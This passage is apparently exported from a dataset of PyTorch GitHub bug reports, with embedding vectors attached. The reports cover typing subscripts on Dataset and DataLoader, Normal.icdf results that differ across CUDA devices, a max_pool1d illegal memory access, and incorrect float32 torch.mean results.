>>> class SomeDatasetClass(Dataset[List[torch.Tensor]]):
...     ...
... 
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
TypeError: 'type' object is not subscriptable
```

```python
>>> import torch
>>> from typing import List
>>> from torch.utils.data import Dataset, DataLoader
>>> class SomeDatasetClass(Dataset):
...     ...
... 
>>> def _create_dataloader(is_train: bool) -> DataLoader[List[torch.Tensor]]:
...     ...
... 
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
TypeError: 'type' object is not subscriptable
```

## Expected behavior

`DataLoader` and `Dataset` should inherit `typing.Generic`, so above code should run without any exceptions.

```python
>>> from typing import Generic, TypeVar
>>> T = TypeVar('T')
>>> class SomeGenericClass(Generic[T]):
...     ...
... 
>>> def create_some_generic_class() -> SomeGenericClass[bool]:
...     ...
...
>>>
```

Like above code snippet.

## Environment

 - PyTorch Version (e.g., 1.0): 1.5.0
 - Python version: Python 3.7.5

## Additional context

I think this issue is related to #31765


cc @ezyang @gchanan @zou3519",True,"[-0.41434056 -0.15212    -0.32569468 -0.04385718 -0.00806633 -0.40496045
 -0.1739381   0.3547292  -0.553635    0.00896185 -0.06895261 -0.08340298
 -0.35041183  0.16653298  0.05185031  0.20058972  0.10103045 -0.2662494
 -0.04477088 -0.08672158  0.03920204 -0.00189462 -0.14978343 -0.20992559
 -0.00480068  0.15614893 -0.22221887 -0.14728262 -0.065638    0.24548545
 -0.02116966 -0.13134491 -0.14506646  0.11492035  0.28515145 -0.08859471
 -0.37925512 -0.253284   -0.09545188 -0.02707531  0.20364395  0.03260507
 -0.16586885  0.1491743  -0.5442003   0.1779537  -0.08828244  0.34719753
 -0.24458367 -0.02393486 -0.28353244 -0.0864922  -0.16852383 -0.02498225
  0.25847983 -0.28808796 -0.18373975  0.03574421  0.08824239 -0.15345353
  0.02448357 -0.37715545  0.28314364 -0.10634726  0.17096049 -0.0616172
 -0.03549471  0.05003677  0.6926872  -0.38171273  0.12286928  0.08603351
 -0.14524013  0.21545723 -0.0007507  -0.19136703 -0.51867723  0.29867536
 -0.17817545 -0.20814073 -0.1200744   0.02370694 -0.17389265  0.12035176
  0.00517315 -0.13144973  0.121284    0.09912729 -0.04282739  0.35499197
  0.21133101  0.08237585  0.30698     0.46736607 -0.21650589  0.22687155
  0.3726337   0.3038969  -0.43897122 -0.6193683  -0.12546754 -0.693502
 -0.32057172  0.6136147   0.06028643 -0.5308964   0.10232224  0.34307754
  0.09876625 -0.1452636   0.17215005  0.3490214  -0.44263536 -0.27649322
 -0.36967093 -0.35006884 -0.5688288  -0.1252665  -0.5047348   0.16748272
  0.06002202  0.04284521 -0.26075995  0.18646577  0.46602303  0.08213213
 -0.11144561  0.03629732  0.01210516  0.12967215  0.11379015 -0.00912371
  0.04448744 -0.25877437  0.3534754   0.29002738 -0.54316145 -0.3442431
 -0.25562382 -0.3419024   0.04267837  0.31797636  0.00127412 -0.35207593
 -0.07913485  0.13627645 -0.05535629 -0.08011441  0.02831294  0.36359704
  0.05687173  0.03631113 -0.4106834   0.40958235 -0.09659762 -0.15202212
  0.52584517  0.0625712   0.39628184 -0.40433985 -0.01081618  0.45095426
  0.4475157  -0.11108002  0.40589875 -0.2322752  -0.26249033 -0.07156737
 -0.1693427   0.1447449  -0.3603313   0.05783293 -0.13266522 -0.32706225
  0.10028855 -0.11500685  0.10167665 -0.34686935 -0.02919718  0.04545898
  0.64218664  0.4817449   0.30143052 -0.11040519  0.09713863  0.0780239
  0.18872401 -0.12911181 -0.25716442 -0.38413227 -0.29984456  0.20578763
  0.40372798 -0.23088028 -0.00672011 -0.05909856  0.15590093  0.11293557
  0.16545379 -0.02808498 -0.02983515  0.43877143  0.15307868  0.13136476
  0.27541018  0.02509768 -0.46631598 -0.38582933 -0.10686517 -0.01352448
 -0.30788678  0.08518878 -0.36385888 -0.07517488 -0.07221974  0.29052675
 -0.12346724  0.3006314   0.13790813 -0.0147203  -0.03775808 -0.10976104
 -0.09572703 -0.3481888   0.05221631  0.3438534   0.15703036  0.18607117
  0.17166783  0.122555   -0.06342327 -0.39168555  0.22267672  0.13344474
  0.01889201  0.5219144   0.04893287 -0.21390158 -0.11097836  0.29250148
 -0.19075271 -0.31512582 -0.14094153 -0.4824087  -0.05951361  0.05503935
 -0.00170254  0.07610459 -0.26589563  0.1730527  -0.30044153  0.08618444
  0.1962076  -0.10113966  0.3398189   0.22914723  0.23664795 -0.25012845
 -0.05769449 -0.2892605   0.15361941  0.40028995  0.03277449  0.52999866
  0.17591718 -0.12792602 -0.21211961  0.30658093 -0.20152894 -0.13119264
  0.29137674 -0.19419636  0.50599474  0.3413002   0.35072806 -0.05828431
  0.5001426  -0.00823365  0.11283975 -0.02198059  0.534313    0.14020762
  0.24331592  0.01883269  0.7284361  -0.14399803 -0.01852616 -0.42229992
 -0.3472522  -0.13537546  0.0764602  -0.21647745  0.3122388   0.0951186
 -0.3521156  -0.44600832  0.24237159 -0.15457977  0.32911468  0.09091923
 -0.45647186  0.12092719  0.10097688 -0.1843706  -0.23373179  0.12433756
 -0.03980118  0.06788725  0.70458853 -0.40325344  0.26950076 -0.04747398
 -0.43128774 -0.01071604 -0.11684626  0.03127562 -0.05173248  0.37348014
  0.07637471  0.03269641  0.09137017 -0.47770095 -0.037068    0.04060765
  0.45311266  0.08999649 -0.5189475   0.4938353   0.23536687  0.35448968
  0.2757758  -0.07775755  0.16961542 -0.01525131 -0.00472494 -0.3859327
  0.0382829   0.19941165  0.0677708  -0.28814042 -0.11685443 -0.09297918
 -0.05064947 -0.09357972 -0.10891022  0.07521881  0.2734764   0.43424684
 -0.09871276  0.04831128  0.01631393  0.11596205  0.20606732  0.1760524
 -0.26798728  0.47233373 -0.19811334  0.30581373  0.10217427  0.00699656
  0.10037705  0.34951007 -0.4621306   0.08353273  0.06285958 -0.14884737
 -0.17278613  0.08169967 -0.00859877  0.52876824 -0.30344823  0.09459024
 -0.03622324  0.30601698  0.13003385 -0.17463222  0.31601655 -0.34326297
  0.00527077  0.17586184  0.34274757 -0.0162009  -0.06985758 -0.16684279]"
Normal.icdf is differs on different cuda devices high priority module: cuda triaged module: correctness (silent),"## ðŸ› Bug

Normal.icdf is different on different cuda devices

Steps to reproduce the behavior:

[normal_cdf_bug.ipynb.txt](https://github.com/pytorch/pytorch/files/4664656/normal_cdf_bug.ipynb.txt)
<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

```
import torch
x = torch.rand(10, dtype=torch.double)
normal = torch.distributions.Normal(0,1)
normal.icdf(x)
```
Output: 
>>> tensor([-0.0274,  0.9183,  0.8124,  0.1397, -0.1859,  0.0392, -0.3418,  0.8999,
         2.2092, -0.5433], dtype=torch.float64)

```
normal = torch.distributions.Normal(0,1)
normal.icdf(x.cuda())
```
Output:
>>> tensor([-0.0274,  0.9183,  0.8124,  0.1397, -0.1859,  0.0392, -0.3418,  0.8999,
     2.2092, -0.5433], dtype=torch.float64)
```
normal = torch.distributions.Normal(0,1)
normal.icdf(x.cuda(1))
```
Output:
>>> tensor([-0.0219,  0.6415,  0.5835,  0.1111, -0.1475,  0.0313, -0.2675,  0.6318,
         0.9728, -0.4131], device='cuda:1', dtype=torch.float64)
## Expected behavior

I expected Normal.icdf to be the same on all devices.

## Environment
Collecting environment information...
PyTorch version: 1.6.0a0-fb
Is debug build: No
CUDA used to build PyTorch: 9.2.88

OS: CentOS Linux 7 (Core)
GCC version: (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39)
CMake version: Could not collect

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: Could not collect
GPU models and configuration: 
GPU 0: Tesla V100-SXM2-16GB
GPU 1: Tesla V100-SXM2-16GB
GPU 2: Tesla V100-SXM2-16GB
GPU 3: Tesla V100-SXM2-16GB
GPU 4: Tesla V100-SXM2-16GB
GPU 5: Tesla V100-SXM2-16GB
GPU 6: Tesla V100-SXM2-16GB
GPU 7: Tesla V100-SXM2-16GB

Nvidia driver version: 396.69
cuDNN version: Could not collect

Versions of relevant libraries:
[pip] Could not collect
[conda] Could not collect

cc @ezyang @gchanan @zou3519 @ngimel",True,"[-1.10926203e-01 -4.66431737e-01 -8.06638226e-02 -2.09447861e-01
  1.21751204e-02 -3.62704694e-01 -2.62728073e-02  2.43061557e-01
 -4.16368306e-01  6.47936948e-03  2.56262779e-01  7.02383742e-02
  2.75975645e-01 -5.66587038e-03 -2.19556943e-01  7.80442283e-02
 -1.12355269e-01 -5.43169737e-01 -2.16134816e-01  2.27674544e-01
 -8.06193948e-02  2.51597673e-01  2.25120172e-01 -8.47617537e-02
 -4.28113900e-02  1.13942809e-01 -1.57297492e-01 -7.08646625e-02
  8.71760249e-02 -6.37291092e-03  1.42283350e-01  3.62996280e-01
  1.70552850e-01  2.20789641e-01 -5.01755066e-03  1.22223973e-01
 -2.53553748e-01 -2.09701523e-01 -3.51176620e-01 -1.11806788e-01
 -2.90799081e-01 -1.29531622e-01  2.55959034e-01  1.84095532e-01
 -1.60897911e-01  2.67642260e-01 -8.01608115e-02  1.45913199e-01
 -1.51109144e-01  2.23497357e-02  3.60020190e-01  7.97542185e-02
 -4.40485030e-03  9.02227163e-02  3.35168302e-01  3.15337032e-02
 -2.72447616e-01  6.23885915e-02 -4.60032932e-02  2.19001830e-01
  2.55297899e-01 -1.65593177e-01 -1.53794959e-01  3.54144424e-02
  1.32215142e-01  3.28636706e-01  3.50667894e-01 -1.37425944e-01
  3.12551081e-01 -9.82751846e-02 -6.58790767e-02  4.49508250e-01
 -2.56355822e-01 -1.27580553e-01  1.39525801e-01  2.59458035e-01
 -2.10526153e-01 -7.51592368e-02 -3.26139033e-01 -1.94816947e-01
 -9.69353840e-02  2.12918401e-01  2.25572437e-01 -5.69069386e-01
  1.74863618e-02 -2.03399971e-01  2.45942950e-01 -6.15771338e-02
 -2.95891941e-01  6.20552301e-02  3.73332858e-01  2.70434439e-01
 -1.14149511e-01  3.29760313e-01 -1.60060048e-01  1.54231966e-01
  2.76019841e-01 -1.70324534e-01 -2.15843499e-01 -2.40315944e-02
 -1.08760059e-01 -1.29540026e-01 -3.37373614e-01  4.34807748e-01
  4.04153913e-02 -3.99377108e-01 -5.88344336e-02 -7.45742321e-02
 -4.73238647e-01  3.98683012e-01  1.36205867e-01 -1.28100216e-01
  4.48587164e-02 -1.49479620e-02  1.64539933e-01 -1.08907506e-01
  8.51025507e-02 -4.39916588e-02  4.23478149e-02 -2.05750883e-01
 -1.80782720e-01 -2.06969142e-01 -2.08248585e-01 -3.14258188e-01
  1.14065267e-01  3.91659774e-02  1.75416708e-01 -6.49099648e-02
 -3.29137623e-01  1.28165811e-01 -1.01682670e-01 -4.93309833e-02
  1.44075453e-01  6.01572245e-02  3.65403108e-02  5.43035388e-01
 -1.78432494e-01 -2.10683152e-01 -6.39452413e-03  2.63293087e-01
 -3.24815586e-02  3.68740469e-01 -2.74707079e-02  2.14040667e-01
  6.46397695e-02 -2.25680284e-02 -1.50341779e-01  4.22923081e-03
  1.47151262e-01  2.11661961e-02  2.47428700e-01  2.44429186e-02
 -8.97358134e-02  1.20622866e-01  1.22399546e-01  4.30353582e-02
  4.83383425e-02 -1.60012506e-02  1.60214201e-01 -3.29043716e-01
  2.69999206e-01  7.28353858e-03  2.33289361e-01  3.30693483e-01
  1.30339816e-01  2.48957098e-01 -3.46752882e-01 -2.10075423e-01
 -2.65002847e-01  1.37826711e-01  3.76809984e-02 -2.13704437e-01
  3.15323710e-01  2.22465638e-02  6.20207451e-02 -6.35949492e-01
 -1.11233339e-01 -1.52979180e-01  1.23163208e-01 -4.91478667e-02
  3.22788239e-01  3.49062234e-01  1.24943241e-01  1.05459116e-01
  2.11836696e-02 -7.57119209e-02 -6.34726603e-04  3.18013787e-01
 -2.11240366e-01 -1.25474930e-01 -1.60994053e-01 -1.17554978e-01
  5.18969968e-02  5.25262356e-02  3.45991030e-02 -3.17472696e-01
  1.71349183e-01  1.35628313e-01  2.79104173e-01 -3.17893848e-02
  5.82814515e-02  1.41059682e-01  1.91143572e-01  2.92222202e-01
  5.04987016e-02 -6.58257827e-02 -2.53805459e-01 -3.78940046e-01
 -1.61490485e-01  3.25375229e-01 -4.24464583e-01 -1.33526951e-01
 -2.68501878e-01 -4.24014509e-01 -2.33928844e-01  5.52307010e-01
 -4.91759554e-03  1.53597385e-01  8.96309316e-03 -1.10516228e-01
  4.14454341e-01 -4.50623035e-02  3.93201768e-01 -1.45903960e-01
  1.97162762e-01  1.85716301e-01 -3.27321328e-02 -6.94591850e-02
 -7.12303892e-02  3.66076738e-01  1.11533776e-01  2.49897182e-01
 -5.25095388e-02 -1.22450545e-01 -7.81763420e-02  1.89429596e-01
 -8.43069926e-02  3.43432557e-03  1.06244177e-01 -2.29146630e-02
 -9.67990607e-02  2.33834554e-02 -1.24625161e-01 -8.07873011e-02
  3.13118637e-01  5.12618646e-02 -7.38418847e-03  7.97642767e-02
  7.84072094e-03  1.23328492e-02 -3.39399695e-01  3.05745304e-02
  4.27779220e-02 -2.42305934e-01  1.75860316e-01  1.44616753e-01
  2.26992205e-01  7.71243721e-02 -5.76774292e-02 -1.59121424e-01
  1.72860578e-01  4.38915640e-01 -8.17526728e-02  3.45418274e-01
 -2.05961615e-01  1.06304232e-02 -4.86867547e-01 -7.61108994e-02
 -3.34335327e-01 -7.03098811e-03  1.59941092e-01 -3.54232758e-01
  4.95153606e-01  1.26480004e-02  3.16211104e-01  8.04506093e-02
  2.27660567e-01 -1.27602577e-01  1.45715058e-01  1.67347521e-01
 -1.58274144e-01 -1.31981879e-01  1.48718819e-01 -5.18179908e-02
  1.43969700e-01 -3.58694404e-01 -4.72487688e-01 -4.07487333e-01
 -3.18622857e-01 -3.45633984e-01  1.20769121e-01 -3.30009945e-02
  2.00528085e-01 -1.30552202e-01 -1.68563843e-01  2.56384194e-01
  3.97440270e-02 -2.53802985e-01  4.40126285e-02 -4.43823636e-01
  3.11928727e-02 -1.17529698e-01 -2.56253719e-01  1.23760954e-01
 -2.12677494e-01  1.46211267e-01 -9.75778326e-02  3.51582140e-01
  9.52060968e-02 -2.70380616e-01  5.22303939e-01 -4.17300880e-01
 -3.41431588e-01 -4.14686464e-02 -2.85119414e-01  1.98466346e-01
 -1.03492253e-01  2.64143378e-01  2.80399710e-01  2.54434198e-02
 -1.18898906e-01 -2.91060090e-01 -3.50027859e-01  1.13078281e-02
  1.87054753e-01  2.22065389e-01 -2.25149632e-01  3.59992124e-03
 -9.98622179e-03 -5.18784113e-02  3.16752434e-01 -1.07000247e-02
  1.14222899e-01 -5.26979417e-02 -2.65698016e-01  1.43415064e-01
 -5.62520623e-02 -1.94198728e-01  8.06103498e-02 -1.99805751e-01
 -2.16257021e-01 -2.09358692e-01 -9.44682434e-02 -1.73868448e-01
 -1.58587381e-01  1.81609198e-01  1.41502038e-01  1.69443473e-01
 -4.37004715e-02  9.84220803e-02 -7.59294927e-02 -1.13324061e-01
 -1.65105183e-02 -1.46689415e-01 -1.66000232e-01  1.96394354e-01
  4.83974010e-01  3.37706394e-02  1.00393847e-01  2.36546755e-01
 -1.54389106e-02 -2.02283055e-01 -9.38562304e-02  3.73530611e-02
 -1.61263645e-01 -5.21053374e-02  1.34469002e-01  2.25905418e-01
  2.20454976e-01  1.02111638e-01  1.33634508e-01  7.13761896e-02
  1.04441278e-01  2.69523486e-02  5.55305965e-02 -2.02132180e-01
 -2.59298861e-01 -8.01168196e-03  2.91844815e-01  3.20293963e-01
  8.34942535e-02 -8.95864144e-02 -1.15974173e-02 -8.84361789e-02]"
max_pool1d creates illegal memory access for large kernel sizes module: nn module: cuda triaged,"## ðŸ› Bug

Reported in the forum in [this post](https://discuss.pytorch.org/t/functional-max-pool1d-cuda-error-on-large-tensor/81985) by Robert-Jan Bruintjes.

Minimal code snippet copied from the post:
```python
import torch
import torch.nn.functional as F

x = 6.
size = 10. ** 6
print(f""Size of second dimension: {int(size)}"")
poolsize = 4
x = torch.rand((1,int(size),poolsize), requires_grad=True).to('cuda:0')
y = F.max_pool1d(x.contiguous(), kernel_size=poolsize, stride=None, padding=0)

loss = torch.sum(y)
loss.backward()

""""""
Traceback (most recent call last):
  File ""efficient-segmentation/minimal_example.py"", line 14, in <module>
    loss.backward()
  File ""/home/nfs/username/miniconda3/envs/pytorch-cuda10/lib/python3.7/site-packages/torch/tensor.py"", line 184, in backward
    torch.autograd.backward(self, gradient, retain_graph, create_graph)
  File ""/home/nfs/username/miniconda3/envs/pytorch-cuda10/lib/python3.7/site-packages/torch/autograd/__init__.py"", line 123, in backward
    allow_unreachable=True)  # allow_unreachable flag
RuntimeError: CUDA error: an illegal memory access was encountered
...
```

Verified with latest nightly binary `1.6.0.dev20200506-py3.7_cuda10.2.89`

CUDA core dump yields:
```
CUDA Exception: Warp Illegal Address
The exception was triggered at PC 0x5591bfb37ca0
[Current focus set to CUDA kernel 0, grid 7, block (0,0,160), thread (0,0,0), device 0, sm 0, warp 16, lane 0]
#0  0x00005591bfb37cc0 in void at::native::(anonymous namespace)::max_pool_backward_nchw<float, float>(int, float const*, long const*, int, int, int, int, int, int, int, int, int, int, int, int, int, int, float*)
   <<<(1,1,65535),(256,1,1)>>> ()
```

CC @xwang233 to take a shot at it.


cc @ngimel @albanD @mruberry",True,"[-0.14213076 -0.03184571 -0.6373894   0.00810708 -0.18335524 -0.25590858
 -0.01555705  0.35305822 -0.42132723 -0.15137592 -0.18636698 -0.02564468
 -0.27037308  0.09937473 -0.46383607  0.14691833 -0.0462441  -0.06169181
 -0.34347945 -0.1700983   0.08835524  0.0605575  -0.09590066 -0.08374405
  0.02429722  0.2608229  -0.21476908 -0.14928603  0.28061116 -0.21133886
  0.08687672  0.23773725 -0.0944339   0.13245185  0.20422213 -0.12534055
 -0.34558535 -0.21974362  0.0059177  -0.10445651 -0.06469871  0.30258954
  0.02676857  0.30817688 -0.14399163  0.06873321 -0.13296801  0.27110192
 -0.16512686 -0.27811366 -0.00513254  0.18601345  0.01837909 -0.13223155
  0.11440293 -0.2970948  -0.21325354 -0.00191351  0.0070321  -0.10632212
  0.2599246  -0.12174708  0.18689625 -0.06130854  0.09209322 -0.15198477
  0.00537804  0.11112612  0.30942813  0.14753515  0.03253413  0.20952444
 -0.4325332   0.02183877  0.24985187  0.07554852 -0.21574706  0.20911895
 -0.07490432 -0.07916699  0.02601579  0.22449335  0.1880144  -0.29207414
 -0.07912678  0.06073742  0.2454995  -0.0090347   0.1792228   0.03818241
  0.23470597  0.12395789 -0.2133559   0.3242836  -0.10815509 -0.11718343
  0.08959784 -0.15871751 -0.42131352 -0.26393947 -0.09915426 -0.14076132
 -0.11870433  0.5849729   0.1799992  -0.1044367   0.28204054  0.44193596
  0.01475577  0.02472067  0.53567195  0.04257417  0.17944917  0.11381989
  0.00525242 -0.05744212 -0.3058702  -0.17561355 -0.11857364  0.33448836
 -0.3195118   0.15701297 -0.06416897  0.09661797  0.17785689  0.2349817
  0.11306866  0.00235948 -0.11788918 -0.03465872 -0.13133255  0.06450582
  0.27920794 -0.07002353  0.15395072  0.4480207  -0.39973792 -0.06672032
 -0.28796825 -0.01492781  0.01197188  0.12074475 -0.01927533 -0.379152
 -0.04248434  0.2524479  -0.39475435  0.01327441  0.09014753  0.00189016
  0.1476238  -0.109633   -0.49257323  0.1801021  -0.05765488  0.07841827
  0.33743083  0.07199722  0.07540384 -0.54784405  0.14479211  0.18386728
  0.06004184  0.22257236  0.22356382  0.03510926 -0.29435563 -0.09342694
 -0.28776795  0.15482287 -0.09878913 -0.14867575 -0.22899063 -0.07898672
  0.38531268 -0.31996953 -0.38370973 -0.36311454 -0.06618111  0.24045517
  0.18935129  0.24379808  0.3837551  -0.04379     0.02621621  0.25841352
  0.43265623  0.22357553 -0.10541212  0.00659559 -0.4205724  -0.09523638
  0.04526349 -0.2676932   0.08829592  0.14011599  0.10389469 -0.03179704
  0.04424318 -0.08036283  0.00822834 -0.00078153 -0.1117515   0.21013656
  0.2971269  -0.04083447 -0.4674085  -0.4103941  -0.09457225  0.09212679
 -0.12937115 -0.18726079 -0.46468008 -0.32519093 -0.04569779  0.12464432
  0.01340188 -0.21069255 -0.10359608  0.32585356  0.43324214 -0.34368286
  0.12604235 -0.22388722  0.19367026 -0.22878943 -0.12010121 -0.11467515
 -0.01663856  0.15426676 -0.19633557 -0.25853768  0.16343878 -0.27306256
 -0.06344531  0.4308023   0.10105219 -0.20146927 -0.02483325 -0.04280072
 -0.40552074 -0.01144468  0.06581216 -0.02192221  0.04927675  0.22412002
 -0.17640176  0.17468373 -0.20827295  0.14091231 -0.03256411 -0.11207908
 -0.1195279  -0.02006857  0.4552016  -0.15355504  0.11602636  0.12154511
 -0.06937283 -0.17782958  0.2845062   0.50394833 -0.10253985  0.4042973
  0.1098207   0.03488832 -0.4194192   0.2719674  -0.08990134 -0.03778195
 -0.05941336 -0.2371389   0.45365018 -0.00387599  0.06392647 -0.25469851
  0.36338037 -0.11875041  0.01989448 -0.14810482  0.3049609   0.0385114
  0.28566658  0.06544413  0.30349526 -0.36407343 -0.28966188 -0.1784716
 -0.12210134 -0.11038189 -0.08479778  0.22429079  0.29643452  0.12946853
 -0.1309445   0.17904432  0.07493474  0.18441007 -0.00348733 -0.03176793
 -0.23158461  0.4220366   0.25191304  0.10222998 -0.37659556  0.07314223
 -0.01175637 -0.05105884  0.7622697  -0.20564955  0.31253475 -0.06135932
 -0.40450102  0.4699455  -0.24153122 -0.10743251 -0.03945982  0.2507858
  0.34487975  0.00772007  0.03412405 -0.3938871  -0.51070625  0.13226746
  0.15485242 -0.01392879 -0.48038432  0.34468234 -0.24050689  0.3758456
  0.10627192  0.0096788   0.06514183 -0.02076722 -0.18925239  0.04545332
 -0.09590061  0.08670461 -0.03491507 -0.0932929  -0.04277355 -0.05400952
  0.09722599 -0.28018844 -0.06309547 -0.2684384   0.42611158  0.44778585
  0.1143738  -0.17161053 -0.03715403  0.08894399  0.07394665  0.16057053
  0.11386351  0.45501328 -0.00519313  0.10458361 -0.02025157  0.13541326
 -0.18135841  0.01457902 -0.2374347  -0.1230773  -0.07150975 -0.00685977
 -0.2977984   0.10965383  0.120628    0.22396106 -0.18781742  0.22401315
 -0.00153025  0.41603985  0.34175438 -0.10830197 -0.20722812 -0.00411381
 -0.0673901  -0.15219957  0.18393995  0.2788995   0.07900281 -0.20663056]"
torch.mean returns a wildly incorrect result 0.3277 on YCbCr version of CIFAR10 on CPU with dtype=float32 high priority module: numerical-stability triaged module: type promotion module: correctness (silent),"## ðŸ› Bug

When I load CIFAR10 training dataset, convert it to YCbCr, convert it to tensors, transpose it to HWC format and turn it into one large CPU float32 tensor and calculate its channels means, the result is wildly incorrect.

Also, the incorrect result it produces is (0.3277, 0.3277, 0.3277) - the same as reported in https://github.com/pytorch/pytorch/issues/10248, where the author doesn't even convert it to YCbCr. I think this suggests that this is just some bug in `torch.mean`. Also, on my local machine I only encounter this bug if I try to calculate mean for all 3 channels at once. If I instead calculate it for only one channel, I don't get 0.3277.

## To Reproduce

Code snippet:

```python
from typing import Tuple
from PIL.Image import Image
from einops import rearrange # pip install einops
import torch
from torchvision.datasets import CIFAR10
from torchvision.transforms.functional import to_tensor

tv_ds = CIFAR10(""."", download=True)
YCbCr_images: Tuple[Image, ...] = tuple(image.convert(""YCbCr"") for image, label in tv_ds)
tensors: Tuple[torch.Tensor, ...] = tuple(
    rearrange(to_tensor(image), ""c h w -> h w c"") for image in YCbCr_images
)
x = torch.stack(tensors).unsqueeze(0)  # 1 Ã— 50000 Ã— 32 Ã— 32 Ã— 3                                                                                                                                                                             
x_flattened = x.reshape(-1, 3)
print(x_flattened.mean(dim=0))  # (0.3277, 0.3277, 0.3277)                                                                                                                                                                                   
for channel in range(3):
    print(x_flattened[:, channel].mean())  # 0.3277, 0.3277, 0.3277 on google colab, but 0.4794, 0.4916, 0.5037 on my local machine                                                                                                                                                                     
print(x_flattened.double().mean(dim=0))  # (0.4790, 0.4809, 0.5077)                                                                                                                                                                          
print(x_flattened.cuda().mean(dim=0))  # (0.4790, 0.4809, 0.5077)
```

[Google colab link](https://colab.research.google.com/drive/1hV54M8zH3Cpx6n-A-JHSSuCVnZ1oBvdC?usp=sharing)

## Expected behavior

I expect to get the correct result rather than (0.3277, 0.3277, 0.3277).

## Environment

On my local machine:

```
Collecting environment information...
PyTorch version: 1.4.0
Is debug build: No
CUDA used to build PyTorch: 10.1

OS: Debian GNU/Linux 10 (buster)
GCC version: (Debian 8.3.0-6) 8.3.0
CMake version: version 3.13.4

Python version: 3.8
Is CUDA available: Yes
CUDA runtime version: 9.2.148
GPU models and configuration: 
GPU 0: GeForce RTX 2080 SUPER
GPU 1: GeForce GTX 1070

Nvidia driver version: 418.113
cuDNN version: Could not collect

Versions of relevant libraries:
[pip3] numpy==1.16.2
[conda] cudatoolkit               10.1.243             h6bb024c_0  
[conda] mkl                       2020.0                      166    conda-forge
[conda] numpy                     1.18.1           py38h95a1406_0    conda-forge
[conda] pytorch                   1.4.0           py3.8_cuda10.1.243_cudnn7.6.3_0    pytorch
[conda] pytorch-ignite            0.3.0                    pypi_0    pypi
[conda] pytorch-lightning         0.7.1                    pypi_0    pypi
[conda] torchvision               0.5.0                py38_cu101    pytorch
```

On google colab:

```
Collecting environment information...
PyTorch version: 1.5.0+cu101
Is debug build: No
CUDA used to build PyTorch: 10.1

OS: Ubuntu 18.04.3 LTS
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
CMake version: version 3.12.0

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: Tesla K80
Nvidia driver version: 418.67
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip3] numpy==1.18.4
[pip3] torch==1.5.0+cu101
[pip3] torchsummary==1.5.1
[pip3] torchtext==0.3.1
[pip3] torchvision==0.6.0+cu101
[conda] Could not collect
```

cc @ezyang @gchanan @zou3519 @nairbv",True,"[-0.57503426 -0.17872614 -0.36689115 -0.00952707 -0.21281785 -0.21411614
 -0.14924696  0.3363642  -0.23359427 -0.14685398 -0.14171565 -0.03085194
 -0.20377299  0.08840305 -0.40591103 -0.14911008 -0.1379734  -0.35687256
  0.06890304 -0.27573246 -0.11218312 -0.06484097 -0.32761115  0.19074336
  0.15207592  0.20105654 -0.184822   -0.03434772  0.3512317   0.08146271
  0.03783835  0.01423205 -0.05066476 -0.04191852 -0.09568804  0.12394226
 -0.17068417  0.05076242 -0.34893513  0.0792963   0.00241479  0.24660182
  0.03314287  0.07577237  0.13557407  0.2358609  -0.02012736  0.1452353
 -0.05051578 -0.07177676 -0.07694334  0.25510284 -0.10723653  0.16700898
  0.08226657 -0.24803467 -0.17433244  0.12207191  0.10064532 -0.26328015
  0.21994641 -0.26115453  0.1566715  -0.2714594   0.05989337 -0.1280314
  0.2849704   0.14796889  0.4154563   0.18664807 -0.29700518 -0.00112177
  0.08068015  0.06152342  0.0246295   0.20225623 -0.35638508  0.1529383
  0.14254521 -0.2998501   0.35852283  0.05008476 -0.16207215 -0.05837402
  0.4902755  -0.09850031  0.24127868 -0.4047818   0.3590563   0.2898024
  0.24437407  0.23301563 -0.02815464  0.28189033 -0.3992269   0.1764431
  0.29664975 -0.18714142  0.05834249  0.08883945  0.05021368 -0.21210149
 -0.22093537  0.2744651   0.01956198 -0.2078672   0.20761257  0.40344936
  0.23707949 -0.09973812  0.16357785  0.06527832 -0.27288467 -0.26155168
  0.10216561  0.18576545 -0.27770275 -0.21190473 -0.13138792  0.1315093
 -0.08302084  0.19709349 -0.05062982  0.09594519  0.26156184 -0.0335323
  0.11456165 -0.1834662  -0.04481788  0.06969412 -0.01747805  0.08759546
 -0.13874628 -0.279161    0.24290174  0.5385731  -0.0968429  -0.0112025
 -0.14616483 -0.20651937  0.09724459  0.16332737 -0.05577908 -0.22560821
  0.21064104 -0.14018354 -0.29169732 -0.03950281  0.2775516  -0.06348616
  0.18572372 -0.22925852 -0.26263678  0.2595577   0.1475072   0.09372149
 -0.03109904  0.14100239  0.28362077 -0.2510737   0.13370305  0.07443944
  0.17243284 -0.00988518  0.39048165  0.15739043 -0.01053779 -0.01378087
 -0.40454775  0.25561437 -0.15415716 -0.30334985 -0.04260164 -0.02617151
  0.32024688 -0.19644278 -0.04665146  0.00539428 -0.18272552  0.2646533
  0.47161713  0.49307656  0.48138624  0.26329437 -0.09003577  0.27704132
  0.3464562  -0.2051517  -0.12762778  0.09211102 -0.3909319  -0.09810741
 -0.0509245   0.09709725 -0.08351536 -0.06559663 -0.0665863  -0.3346606
 -0.04463787 -0.04101089 -0.29602972 -0.05240063  0.06030563 -0.14475828
  0.04320382 -0.01544285 -0.18336922 -0.336959   -0.39074323  0.09520101
 -0.1739968  -0.18682337 -0.0738563  -0.05096811  0.2517536  -0.04192675
 -0.2090498  -0.25154233 -0.23298894  0.14540353  0.5733811   0.04896102
  0.08596887 -0.15330961 -0.05749656  0.26460975 -0.23096114 -0.08202922
 -0.16484873  0.02267059  0.13475052 -0.11031159  0.18303902 -0.0056182
  0.18910578  0.17142114 -0.5999665   0.01432482 -0.07484228 -0.18800564
 -0.4199814  -0.10112862  0.03566669 -0.18416923 -0.11136909  0.098607
  0.00943391 -0.0066082  -0.13924456 -0.06675648 -0.02715365  0.14681031
  0.05045842 -0.06589288  0.21125394  0.18679474  0.23254424  0.07802585
 -0.12418125 -0.01406699  0.21627343  0.3162075   0.04777063  0.2804383
  0.2799674   0.189242   -0.18595397  0.20723842 -0.27517757  0.3791822
  0.09048967 -0.30689222  0.45551372  0.1211881   0.36108977 -0.3619911
  0.19117254  0.534938   -0.0612279  -0.27384803 -0.03592399  0.4975348
